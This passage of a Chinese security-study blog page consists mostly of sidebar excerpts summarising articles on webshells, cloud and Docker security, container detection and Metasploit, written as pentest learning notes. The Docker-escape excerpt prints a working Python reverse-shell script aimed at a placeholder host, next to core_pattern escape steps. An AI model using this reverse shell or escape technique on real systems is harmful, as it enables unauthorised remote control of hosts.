@@ -1,0 +1,1506 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>数据结构之查找 | mrlxl的知识库</title>
+<script>
+  (function() {
+    const savedTheme = localStorage.getItem('theme');
+    const html = document.documentElement;
+    if (savedTheme) {
+      html.setAttribute('data-theme', savedTheme);
+    } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+      html.setAttribute('data-theme', 'dark');
+    }
+  })();
+</script>
+
+      <link rel="stylesheet" href="../../../../css/main.min.1b811b24e25dcc4d4e5cab50b3b6089531edce29a8d36035967c1f4af823ee08.css" integrity="sha256-G4EbJOJdzE1OXKtQs7YIlTHtzimo02A1lnwfSvgj7gg=" crossorigin="anonymous">
+
+
+        <script src="../../../../js/main.c7c382a34629504a0438bf6064d168a2df4a02e88159bc8148fc2bd4f2e54d01.js" integrity="sha256-x8OCo0YpUEoEOL9gZNFoot9KAuiBWbyBSPwr1PLlTQE=" crossorigin="anonymous"></script>
+
+
+</head>
+<body>
+  <header>
+    <div class="header-inner">
+  
+  <div class="header-left">
+    
+    <img src="../../../../avatar.jpg" alt="Avatar" class="header-avatar">
+    
+    
+    <a href="../../../../" class="header-title">mrlxl的知识库</a>
+    
+    
+    <a href="../../../../" class="header-home-btn" title="首页">
+      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+        <polyline points="9 22 9 12 15 12 15 22"></polyline>
+      </svg>
+    </a>
+  </div>
+
+  
+  <div class="header-right">
+    
+    <a href="https://mrlxl.cn" target="_blank" class="header-about-btn">关于我</a>
+
+    
+    <button id="mobile-search-trigger" class="mobile-search-btn">
+      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="11" cy="11" r="8"></circle>
+        <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+      </svg>
+    </button>
+
+    
+    <div class="theme-switch-wrapper">
+      <label class="theme-switch" for="checkbox">
+        <input type="checkbox" id="checkbox" />
+        <div class="slider round">
+          
+          <svg class="icon-moon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+          </svg>
+          
+          <svg class="icon-sun" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="5"></circle>
+            <line x1="12" y1="1" x2="12" y2="3"></line>
+            <line x1="12" y1="21" x2="12" y2="23"></line>
+            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+            <line x1="1" y1="12" x2="3" y2="12"></line>
+            <line x1="21" y1="12" x2="23" y2="12"></line>
+            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+          </svg>
+        </div>
+      </label>
+      <script>
+        
+        (function() {
+          const html = document.documentElement;
+          const checkbox = document.getElementById('checkbox');
+          if (html.getAttribute('data-theme') === 'dark') {
+            checkbox.checked = true;
+          }
+        })();
+      </script>
+    </div>
+  </div>
+</div>
+
+  </header>
+  <main>
+    
+<div class="container">
+  <div class="sidebar-left tree">
+  <div class="search-trigger" id="search-trigger">
+    <span class="search-icon">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M15.5 14H14.71L14.43 13.73C15.41 12.59 16 11.11 16 9.5C16 5.91 13.09 3 9.5 3C5.91 3 3 5.91 3 9.5C3 13.09 5.91 16 9.5 16C11.11 16 12.59 15.41 13.73 14.43L14 14.71V15.5L19 20.49L20.49 19L15.5 14ZM9.5 14C7.01 14 5 11.99 5 9.5C5 7.01 7.01 5 9.5 5C11.99 5 14 7.01 14 9.5C14 11.99 11.99 14 9.5 14Z" fill="currentColor"/>
+      </svg>
+    </span>
+    <span class="search-text">搜索文章...</span>
+  </div>
+  <h3>文档</h3>
+  
+  
+
+  
+    
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>web安全进阶</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86%E5%AE%9E%E6%88%98%E4%B8%8E%E6%9F%A5%E6%9D%80/" class="article-link" data-summary="内存马原理、实战与查杀 引言 我们在漏洞挖掘的时候经常看见大牛们发现一个文件上传漏洞时，上传的不是我们熟知的.php文件，而是.jsp文件。这其实利用的不是我们开始学的时候接触的webshell,而是memshell(内存马)。这篇文章将从基础原理开始，依次介绍Servlet内存马，Spring内存马，Agent内存马，Shiro内存马使用以及内存马的检测与查杀。
+一. Java Web 应用的三大组件 想要理解最常见的三种内存马的类型，那么一定要了解Java Web 应用的三大组件 Servlet，Filter，Listener，下面我将结合工程实例具体介绍：
+1.1 Servlet Servlet 是运行在 Web 容器中的 Java 程序，用于接收客户端请求并生成响应，是 Java Web 中处理业务逻辑的核心组件。
+结合大家都知道的当前已经成为主流的 Spring Boot 我们可能对 Servlet 感到更加熟悉一点，但是不论是 Spring MVC 还是 Spring Boot，本质上都是建立在 Servlet 规范之上的封装，它们内部都通过一个或多个 Servlet 来接收并分发 HTTP 请求。 下图是 Java Web 发展史的“标准主线” 一个 Servlet 工程 = Tomcat &#43; Servlet API &#43; 你写的 Servlet 类 &#43; 映射配置，在工程里代码层如何开发一个 Servlet 完整流程如下： Servlet 和 jsp 的关系：JSP(java servlet page) 是一种以页面为中心的 Servlet 编写方式，最终都会被编译成 Servlet 执行。 当你第一次访问一个 .jsp 文件时，Tomcat 会做这几件事：
+">内存马原理，实战与查杀</a>
+        
+      </div>
+    </li>
+  
+  
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>API安全</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>云安全</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="article-link" data-summary="云原生基础知识 正式开始云原生安全的学习，首先了解一下相关的基础知识
+常见名词 记录一些常见的专业术语的意思
+容器 这玩意打CTF的应该都比较熟悉
+Docker 是一个开放源代码软件，是一个开放平台，用于开发应用、交付（shipping）应用、运行应用。Docker允许用户将基础设施（Infrastructure）中的应用单独分割出来，形成更小的颗粒（容器），从而提高交付软件的速度
+Docker 容器与虚拟机类似，但二者在原理上不同:
+容器是将操作系统层虚拟化 虚拟机是虚拟化硬件 按照上面的比较，可以知道容器能更便携高效地利用服务器
+接下来一下Docker官方给出的架构图：
+可以看见里面包括了Docker客户端、Docker容器所在宿主机、Docker镜像仓库三部分
+而宿主机包括了Docker守护进程、本地容器、本地镜像，Docker守护进程Dockerd的作用是侦听Docker API请求和管理Docker对象
+容器编排 容器编排（Container Orchestration）是指自动化容器的部署、管理、扩展和联网，容器编排可以为需要部署和管理成百上千个 Linux 容器和主机的企业提供便利
+常见的容器编排工具方案有 Kubernetes、Docker Swarm 和 Apache Mesos 等
+无服务 无服务（serverless）是一种云原生开发模型，可使开发人员专注构建和运行应用，简单来说，就是开发者不用去管服务器只负责开发就行
+无服务计算产品通常被分为两类，分别是后端即服务（BaaS）和函数即服务（FaaS），其中 FaaS 是 Serverless 的主要实现方式，FaaS 的相关产品主要有 AWS 的 Lambda、Azure 的 Functions Serverless Compute、GCP 的 Firebase Cloud Functions、阿里云的 Function Compute 等
+微服务 微服务（Microservices）是一种软件架构风格，它是以专注于单一责任与功能的小型功能区块为基础，利用模块化的方式组合出复杂的大型应用程序，各功能区块使用与语言无关的API集相互通信
+服务网格 服务网格（Service Mesh）用于控制应用的不同部分之间如何共享数据，服务网格内置于应用程序中的专用基础架构层，这个可见的基础架构层可以记录应用的不同部分是否能正常交互
+云原生安全 云原生 云 ：运行在云服务器上 原生 ：将应用运行到云上，充分的利用云自身的特点，比如弹性和分布式优势（且业务按照云来设计，而不是简单迁移） 云原生技术有利于各组织在公有云、私有云和混合云等新型动态环境中，构建和运行可弹性扩展的应用。云原生的代表技术包括容器、服务网格、微服务、不可变基础设施和声明式 API
+云原生安全 云原生安全至少包含了微服务安全、无服务安全、编排平台安全、服务网格安全、容器安全、宿主机安全等等。
+根据云原生环境的构成，面向云原生环境的安全体系可以概括为以下三个层面：
+容器安全 编排系统安全 云原生应用安全：包括了微服务、无服务、服务网格、零信任体系、API 安全等等 另外除了这些和云原生环境相关的技术之外，云原生安全还包含了一些传统安全的内容，比如宿主机的安全等等。
+">云原生基础知识</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%AD%A6%E4%B9%A0/" class="article-link" data-summary="云服务学习 云服务就是云上的服务，比如从云厂商（AWS、阿里云）买来的服务
+国内云厂商：
+阿里云 腾讯云 华为云 天翼云 Ucloud 金山云 &amp;amp;hellip;&amp;amp;hellip; 国外云厂商：
+AWS GCP Azure &amp;amp;hellip;&amp;amp;hellip; 每个云厂商对云服务的叫法不同，这里以AWS的为例：
+S3对象存储（Simple Storage Service），可以简单理解为网盘，略有区别 EC2弹性计算服务（Elastic Computer Cloud），简单理解为云上的虚拟机 RDS云数据库（Relational Database Service），简单理解为云上数据库 IAM身份管理和访问管理（Identity and Access Management），简单理解为云控制台上的一套身份管理服务，可以用来管理每个子账号的权限 综上来看，其实可以简单看作一些本地的功能/服务放到了云上，那么就会产生对应的风险，值得研究
+在下文的案例图片中，笔者可能会更多用国内厂商（比如aliyun）进行举例，漏洞实例使用TerraformGoat靶场进行演示
+学习顺序参考https://wiki.teamssix.com/
+对象存储 对象存储（Object-Based Storage），也可以叫做面向对象的存储，现在也有不少厂商直接把它叫做云存储，很经典的就是Amazon S3 (Simple Storage Service) 简单存储服务，是 Amazon 的公开云存储服务，与之对应的协议被称为 S3 协议，目前 S3 协议已经被视为公认的行业标准协议，因此目前国内主流的对象存储厂商基本上都会支持 S3 协议
+Amazon S3标准中，对对象存储中可以有多个桶（Bucket），而对象（object）存放在桶里，对象包含三个key、Data、Metadata部分：
+Key指存储桶中的唯一标识符，例如一个 URL 为：https://yuy0ung.s3.ap-northeast-2.amazonaws.com/d0g3，这里的 yuy0ung 是存储桶 Bucket 的名称，/d0g3 就是 Key Data很好理解，就是存储的数据本体 Metadata意味元数据，可以简单理解为数据的标签、描述之类的信息（区别于传统的文件存储，在传统的文件存储中这类信息是直接封装在文件里的，而云上有了元数据的存在，可以大大的加快对象的排序、分类和查找） 操作使用Amazon S3的方式大致如下：
+AWS 控制台操作 AWS 命令行工具操作 AWS SDK 操作 REST API 操作，通过 REST API，可以使用 HTTP 请求创建、提取和删除存储桶和对象 接下来记录S3相关攻击手法
+">云服务学习</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/%E8%AF%86%E5%88%AB%E8%99%9A%E6%8B%9F%E6%9C%BAdocker%E5%92%8Ck8s%E9%9B%86%E7%BE%A4%E7%8E%AF%E5%A2%83/" class="article-link" data-summary="识别虚拟机、Docker和K8s集群环境 一、基础 随着云原生应用不断普及，在我们getshell之后，我们还需要判断该shell是否处于虚拟环境中，并判断该虚拟环境的类型，通常情况下，shell的虚拟环境可能有如下三个类型：
+虚拟机 虚拟机是指在一台物理服务器上运行的多个虚拟主机实例，每个虚拟主机实例都拥有自己的环境和资源，通常用于提供Web托管服务
+Docker Docker是一种虚拟化技术，利用容器化的方式将应用程序及其依赖项打包成独立、轻量级的环境，实现快速部署、高效运行和跨平台运行的功能
+K8s Kubernetes（通常简写为K8s）是一个开源的容器编排平台，通过自动化部署、扩展和管理容器化应用，实现高可用性、弹性和灵活性。它提供了集群管理、服务发现、负载均衡等功能，让用户可以更轻松地管理容器化应用的生命周期
+二、思路 如果shell处于虚拟机、Docker或K8s集群环境中，我们需要对环境进行识别，并采取针对性的措施，比如：
+虚拟机：通常考虑横向移动来扩大攻击效果
+Docker：通常先进行容器逃逸，再进行内网横向移动
+K8s：通常先尝试接管集群，以获取对容器和集群资源的完全控制
+三、识别 首先判断当前shell是否采用了虚拟化技术：
+systemd-detect-virt	#识别系统虚拟机（VM）、容器还是裸机上运行 在确认采用了虚拟化技术后，常有如下检测方法可以快速识别当前所处环境类型
+查看主机名和进程 容器的主机名默认随机生成的字符串，PID1非系统进程，可初步判断当前为容器环境
+hostname	#查看主机名 ps aux	#显示系统上所有用户的详细进程信息 通过利用cgroup信息的差异 通过查看cgroup信息，可以判断当前环是否是虚拟机、Docker容器或K8s集群:
+cat /proc/1/cgroup	#用于查看进程ID为1的系统进程（通常是Init进程）所属的cgroup信息，即用于控制和管理进程资源使用的容器技术 也可以针对性的查找关键词，例如针对Docker字符串：
+grep &amp;amp;#39;docker&amp;amp;#39; /proc/1/cgroup	#查找是否存在‘Docker’字符串 检查根目录下.dockerenv文件
+通过判断根目录下的.dockerenv文件是否存在，确认当前环是否为容器环境:
+ls -alh/dockerenv	#列出/dockerenv目录下的所有文件和目录，并显示详细信息以及人类可读的文件大小 通过检查挂载信息
+通过检查挂载信息，推测当前环境是虚拟机、Docker容器还是K8s集群:
+mount lgrep &amp;amp;#39;/type&amp;amp;#39;	#从当前系统中列出所有已挂载的文件系统，并使用grep命令筛选出包含/type路径的挂载信息 查看硬盘信息
+通过查看硬盘信息，推断当前环境是否为容器环境:
+fdisk -l #列出系统上所有磁盘的分区信息 获取当前环境的文件系统和挂载点信息
+获取当前环境的文件系统和挂载点信息，用来判断是否容器环境:
+df -h	#显示文件系统的磁盘使用情况和挂载点信息 通过了解环境变量包含的信息
+通过检查环境变量，了解特定环境的信息:
+env #显示当前系统环境中的所有环境变量 四、反制 对于防守者而言，通过了解攻击者在云原生环境中可能采取的这些信息探测行为，可以建立有效的告警机制，以便及早发现潜在的攻击行为
+">识别虚拟机、Docker和K8s集群环境</a>
+        
+      </div>
+    </li>
+  
+  
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>docker安全</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8%E6%A6%82%E8%A7%88/" class="article-link" data-summary="Docker安全概览 前面的文章已经简单介绍了docker容器相关概念，docker的使用对于接触过ctf出题的人来说还是相对熟悉了，这里也不做过多介绍，接下来从安全的角度来分析一下docker
+Docker面临的风险 镜像风险 镜像的内容是由用户进行配置的，所以有可能造成一些安全问题
+不安全的第三方组件 比如在镜像中引入了一些具有严重nday的组件，毫无疑问，这个镜像也就存在漏洞了
+不安全的镜像 类似供应链攻击，在公共镜像仓库比如 Docker Hub 里，会存在一些有漏洞的镜像或者恶意镜像，如果使用了这些镜像那就存在风险了
+敏感信息泄漏 如果在镜像开发完毕后没有删除自己配置的api key、AK/SK等，那么如果别人获取到该镜像就可能造成敏感信息泄漏
+活动中的容器风险 容器在运行时也有一些能够用户自定义的配置，这些配置不当同样可能造成风险
+不安全的容器应用 比如映射出来的端口的服务存在漏洞，那么自然会导致风险
+不受限制的资源共享 容器运行在宿主机上，容器必然要使用宿主机的各种 CPU、内存等资源，如果没有对容器进行资源使用限制，那么就存在宿主机被资源耗尽的风险
+不安全的配置/挂载 正常来说，容器有两大隔离机制：
+linux命名空间：实现文件系统、网络、进程、主机名等方面的隔离 linux控制组：实现CPU、内存、硬盘等方面的隔离 而配置不当会导致容器本身隔离机制失效：
+&amp;amp;ndash;privileged：使容器内的 root 权限和宿主机上的 root 权限一致，权限隔离被打破 &amp;amp;ndash;net=host：使容器与宿主机处于同一网络命名空间，网络隔离被打破 &amp;amp;ndash;pid=host：使容器与宿主机处于同一进程命令空间，进程隔离被打破 &amp;amp;ndash;volume /:/host：宿主机根目录被挂载到容器内部，文件系统隔离被打破 容器管理程序接口风险 Docker 守护进程主要监听 UNIX socket 和 TCP socket，默认情况下，Docker 只会监听 UNIX socket
+UNIX socket 风险主要在于Docker守护进程默认以宿主机的root权限运行，说到这里其实熟悉后渗透的师傅都能想到，可以利用这一点进行提权，除此之外我们还可以利用这点进行容器逃逸，这类风险有两个利用场景
+普通用户被加到Docker用户组内
+如果普通用户被加入到 Docker 用户组内，那么普通用户也将有权限访问 Docker UNIX socket，如果攻击者获得了这个普通用户权限，就可以借助 Docker 提权到 root 用户权限
+Unix socket挂载到容器内部
+有时为了实现容器内部管理容器，可能会将 Docker UNIX socket 挂载到容器内部，那么如果该容器被入侵，渗透测试人员就可以借助这个 socket 进行容器逃逸获得宿主机 root 权限
+">Docker安全概览</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E9%80%83%E9%80%B8%E6%89%8B%E6%B3%95%E5%A4%A7%E5%85%A8/" class="article-link" data-summary="Docker逃逸手法大全 Docker相关安全风险更多集中在Docker逃逸方面
+和基础的后渗透思路一样，在获取docker的权限后需要对docker进行信息搜集，判断是否具有满足docker逃逸的条件
+判断是否为容器环境 在之前的文章中也提到过，可以通过查看cgroup信息等方法来判断，可以参考我的这篇笔记：快速识别虚拟主机、Docker和K8s集群环境
+不过查看cgroup目录的方法似乎只对cgroup v1有用，所以推荐使用查看根目录.dockerenv的办法：
+ls -al /.dockerenv 确认为容器环境之后，就可以查看是否具有满足逃逸的条件了，接下来从基础概念、环境搭建、信息搜集、漏洞利用等方面记录一下docker逃逸的一些tricks，当然如果比较懒，也可以试试开源的自动检测脚本：项目地址：https://github.com/teamssix/container-escape-check
+挂载宿主机procfs逃逸 基础概念 procfs（/proc）是一个伪文件系统，反映了系统内进程以及其他组件的状态，其中有很多敏感文件
+user namespace是linux的一项安全功能，允许在容器中映射和隔离用户ID
+而在容器内默认启用root权限，且默认没有开启User Namespace时，容器中的root用户与宿主机的root用户UID会一致（均为0），在这种情况下，如果将procfs挂载到不受控的容器中，则可能会导致容器逃逸，这里运用到一个tricks：
+从 2.6.19 内核版本开始，Linux 支持在 /proc/sys/kernel/core_pattern 中使用新语法。如果该文件中的首个字符是管道符 | ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行
+环境搭建 创建容器并挂载/proc目录：
+docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu 搭建完毕
+信息搜集 如果发现了两个core_pattern文件，则可能就是挂载了宿主机的procfs：
+find / -name core_pattern 漏洞利用 找到当前容器在主机下的绝对路径：
+cat /proc/mounts | xargs -d &amp;amp;#39;,&amp;amp;#39; -n 1 | grep workdir 可以看到绝对路径为/var/lib/docker/overlay2/8c1a0695756000c2afc1ba95bf605dda88027b937c937e8f2527b597447f37ac/work
+接下来安装vim和gcc：
+apt-get update -y &amp;amp;amp;&amp;amp;amp; apt-get install vim gcc -y 然后创建一个python脚本用于反弹shell：
+#!/usr/bin/python3 import os import pty import socket lhost = &amp;amp;#34;xx.xx.xx.xx&amp;amp;#34; lport = 7777 def main(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) os.putenv(&amp;amp;#34;HISTFILE&amp;amp;#34;, &amp;amp;#39;/dev/null&amp;amp;#39;) pty.spawn(&amp;amp;#34;/bin/bash&amp;amp;#34;) # os.remove(&amp;amp;#39;/tmp/.shell.py&amp;amp;#39;) s.close() if __name__ == &amp;amp;#34;__main__&amp;amp;#34;: main() 赋予执行权限：
+">Docker逃逸手法大全</a>
+        
+      </div>
+    </li>
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>反序列化</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>后渗透</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>内网渗透</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/msfcs%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8/" class="article-link" data-summary="MSF&amp;amp;amp;CS介绍与使用 免责声明：本文所有内容仅供学习交流，请勿用于违法活动
+Metasploit Framework（MSF） Metasploit是ruby语言开发的一个基于命令行操作的渗透测试框架，我们可以查找，利用和验证漏洞，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程
+一、msf体系框架 msf的整体框架如下：
+我们重点关注模块部分
+模块组织按照不同的用途分为7种类型的模块（Modules）：
+辅助模块（Aux)：负责信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能 渗透攻击模块（Exploits)：利用系统漏洞进行攻击，里面有每一个具体漏洞的攻击方法 后渗透攻击模块（Post)：在取得目标系统远程控制权限后，进行一系列的后渗透攻击动作，如获取敏感信息、跳板攻击等操作 攻击载荷模块（payloads)：成功exploit之后，真正在目标系统执行的代码或指令 编码器模块（Encoders)：主要对payload进行加密，最终达到躲避AntiVirus检查的目的 空指令模块（Nops)：主要作用是提高payload稳定性及维持大小 免杀模块(Evasion)：可以用来创建木马文件 二、Metasploit基本使用 kali中自带了msf，可以直接使用
+Metasploit启动 msf有一个用于存储信息收集数据的关系型数据库Postgresql，可以自主选择是否开启
+msf有三种启动方式：
+先启动Postgresql数据库，再启动Metasploit
+service postgresql start msfconsole 不启动数据库，直接启动Metasploit
+msfconsole 启动Postgresql的同时启动Metasploit
+msfdb run 也可以直接在kali左上角工具点击启动，实际上是自动执行了命令：
+sudo msfdb init &amp;amp;amp;&amp;amp;amp; msfconsole 由于Postgresql数据库的默认端口为5432，所以可以查看该端口来判断是否开启Postgresql数据库：
+netstat -pantu | grep 5432 Metasploit常用命令 在msfconsole中，输入help可以看见各种命令的介绍
+show展示 用于展示可用模块，有效参数是：all，encoders，nops，exploits，payloads，auxiliary, post，plugins，info，options
+展示模块时，每个模块都会有一个名为Rank的字段，该列代表该模块的可靠性
+Rank 的值可以是下面的表格中的其中之一，按照可靠性降序排列
+Ranking Description ExcellentRanking 漏洞利用程序绝对不会使目标服务崩溃，就像 SQL 注入，命令执行，远程文件包含，本地文件包含等等。除非有特殊情况，典型的内存破坏利用程序不可以被评估为该级别。（WMF Escape()） GreatRanking 该漏洞利用程序有一个默认的目标系统，并且可以自动检测适当的目标系统，或者在目标服务的版本检查之后可以返回到一个特定于应用的返回地址。（译者注：有些二进制的漏洞利用成功后，需要特别设置 Shell 退出后的返回地址，否则当 Shell 结束后，目标服务器会崩溃掉。） GoodRanking 该漏洞利用程序有一个默认目标系统，并且是这种类型软件的“常见情况”（英文，桌面应用程序的Windows 7，服务器的2012等常用） NormalRanking 该漏洞利用程序是可靠的，但是依赖于特定的版本，并且不能或者不能可靠地自动检测。 AverageRanking 该漏洞利用程序不可靠或者难以利用。 LowRanking 对于通用的平台而言，该漏洞利用程序几乎不能利用（或者低于 50% 的利用成功率） ManualRanking 该漏洞利用程序不稳定或者难以利用并且基于拒绝服务（DOS）。如果一个模块只有在用户特别配置该模块的时候才会被用到，否则该模块不会被使用到，那么也可以评为该等级。（例如：exploit/unix/webapp/php_eval） search搜索 已知一个漏洞，我想知道Metasploit里面是否有相关的模块，就可以用search进行搜索
+">MSF&amp;CS介绍与使用</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="article-link" data-summary="内网渗透-AD域基础知识 简介 内网也指局域网，是一个封闭的网络空间
+内网渗透（intranet exploitation）是对目标服务器getshell后，通过一系列技术手段对其所处的内网环境进行渗透，最终获取内网其他主机的权限的过程，这些通常涉及以下技术：
+内网信息收集 内网代理 权限提升 横向移动 &amp;amp;hellip;&amp;amp;hellip; 基本概念 工作组（work group） 分辨：在命令提示符界面执行systeminfo，回显结果的“域”信息为WORKGROUP
+简单来说，就是将不同的计算机按照功能或部门分别置于不同的组，适用于网络中计算机不多、资产规模较小、对安全管理控制要求不严格的情况，这是一种松散的资源管理模式，任何人都可以在局域网中创建新的工作任务而无需管理员同意，换言之，处于同一工作组中的主机彼此间地位平等，不存在额外关联或管理关系，对于此类情况，在内网渗透时需要逐个渗透与控制
+在局域网内，计算机默认都是按照工作组的方式进行资源管理的
+优点： 方便管理和维护 资源分配方便和灵活 缺点： 缺乏集中管理与控制的机制 没有集中的统一账户管理 只适合小规模用户的使用 域（domain） 分辨：在命令提示符界面执行systeminfo，回显结果的“域”信息为类似域名格式，由“.”连接的字符串
+当组织中网络规模越来越大时，需要统一的管理和集中的身份验证，并能为用户提供更加方便地的网络资源搜索和使用方式时，就需要放弃工作组而使用域
+域是一种比工作组更高级的的计算机资源管理模式，在域环境中，所有用户账户、用户组、计算机、打印机和其他安全主体都在一个或多个域控制器的中央数据库中注册；当域用户想访问域中的资源时，必须通过域控制器集中进行身份验证，通过身份验证的域用户在域中的身份决定了域用户对域中资源的访问权限
+在域环境中，域管理员用户在域中具有最高访问权限和最高管理权限，在渗透过程中，获取域管理员相关权限往往可以控制整个域控
+单域
+指网络环境中只有一个域
+父域和子域
+某些情况下，需要在一个域中分出多个域，被划分的域称为父域，划分出来的域被称为子域，每个子域都拥有自己的安全策略，在有信任的情况下，父域可以访问子域
+从域名上看，子域是域名中的一个段，用“.”进行域名分割，一个“.”代表域名的一个层级
+域树
+域树是多个域通过建立信任关系组成的一个域集合
+在域树中，所有的域共享同一表结构和配置，所有域名形成一个连续的名字空间，该命名空间具有连续性，域名层次越深，级别越低
+在域树中，域管理员只能管理本域，不能访问或管理其他域，如果两个域之间要互相访问，就需要建立信任关系（trust relation）
+域林
+指由一个或多个没有形成连续名字空间的域树通过建立信任关系组成的域树集合，域林中所有域树共享同一个表结构、配置和全局目录
